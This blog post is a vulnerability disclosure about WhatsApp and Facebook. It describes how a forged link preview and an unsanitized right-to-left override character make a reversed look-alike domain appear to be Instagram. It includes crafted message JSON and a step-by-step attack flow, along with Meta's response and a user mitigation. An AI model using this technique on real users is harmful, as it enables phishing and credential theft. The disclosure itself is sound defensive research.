---
title: Don't Believe Your Eyes - A WhatsApp Clickjacking Vulnerability
categories:
- Reverse Engineering
tags:
- Phishing
- ClickJacking
---
Imagine you have received a WhatsApp message with a link to `ln.instagram.com`.  
Where do you think the link leads? Instagram? Think again.

I have found [clickjacking](https://en.wikipedia.org/wiki/Clickjacking) vulnerability in WhatsApp that enables phishing attacks.  
An attacker is able to send a crafted message to anyone/group with a link that appears to lead to a legitimate website, but in fact the link leads to any website of the attackers choice.

## Discovery Process
I started my research looking for a way to make a message recipient perform a request. My initial thought was to check WhatsApp's link preview feature. I hoped the the link would be rendered twice, once by the sender and once by the receiver. In order to check my theory I created a [webhook](https://webhook.site/) and sent it to a friend. Sadly only 1 request was made, only by me.  
That got me thinking. If the receiver does not render the link for themselves, that must mean I send both the link and the rendering. If so, I wonder if I can send a link to one site but a rendering of a different site.

### Issue #1 - Link Preview Mismatch
An attacker can craft a message with a link to `google.com` and a preview for `instagram.com`

### Issue #2 - Disguising Links
There is no sanitization for the unicode character [`U+202E`](https://unicode-explorer.com/c/202E) (RIGHT-TO-LEFT OVERRIDE) for messages that include links.
This character alters the way text is presented to the user by displaying the text in reverse order.

### Final Result

{final image}

## Attack Scenario
Utilizing both these issues can allow an attacker to perform phishing attacks where they construct links that look like legitimate websites but actually lead to the attacker's site, in order to steal sensitive information.

The full attack flow:
1. The attacker purchases the mirror domain of the site they would like to impersonate.
   For example `moc.margatsni.nl` to impersonate `ln.instagram.com`
2. The attacker creates a message with a link to original domain in order to use its preview.
```json
{
    "text": "https://instagram.com/",
    "matchedText": "https://instagram.com/",
    "canonicalUrl": "https://instagram.com/",
    "description": "Create an account...",
    "title": "Instagram",
    "jpegThumbnail": {},
    "previewType": 0,
    "mediaKey": {},
    "mediaKeyTimestamp": 1693302818542,
    "thumbnailDirectPath": "/v/t62.36...",
    "thumbnailSha256": {},
    "thumbnailEncSha256": {},
    "thumbnailHeight": 1024,
    "thumbnailWidth": 1024,
    "inviteLinkGroupTypeV2": 0
}
```
3. The attacker then removes the `matchedText` property and changes the `text` property to the following value:
   `U+202E` + "URL to the mirror domain" + `//:sptth`
```json
{
    "text": "\u202ehttps://moc.margatsni.nl//:sptth",
    "canonicalUrl": "https://instagram.com/",
    "description": "Create an account...",
    "title": "Instagram",
    "jpegThumbnail": {},
    "previewType": 0,
    "mediaKey": {},
    "mediaKeyTimestamp": 1693302818542,
    "thumbnailDirectPath": "/v/t62.36...",
    "thumbnailSha256": {},
    "thumbnailEncSha256": {},
    "thumbnailHeight": 1024,
    "thumbnailWidth": 1024,
    "inviteLinkGroupTypeV2": 0
}
```
4. Finally the attacker sends the crafted message to their victim

## Meta's Response
> Because we support many different platforms and environments, there are a significant number of ways that some platform could choose to normalize a URL differently than our server-side logic does. To address that, we have systems in place which allow us to adjust our URL normalization logic dynamically in the event of real-world spam and abuse.

Meta has shown no intention to resolve this security issue, and from their response it seems that they will try to stop these attacks only if their systems detect them as spam.
This means that WhatsApp users can only cross their fingers that they won't fall victims to this phishing attack.  
Apposed to WhatsApp, other platforms such as X, TikTok, and Pinterest, all have sanitization of the `U+202E` character in reference to links.
## Mitigation
Because Meta has no intention of fixing this issue, links on WhatsApp cannot be trusted.
In order not to fall victim to this kind of phishing attack, before clicking on a link, copy it. The clipboard preview should show the link address while sanitizing the `U+202E` character.

## Notes
I have also found that Facebook as well does not sanitize the `U+202E` character in regard to links, so this vulnerability applies to `facebook.com` as well.

{facebook image}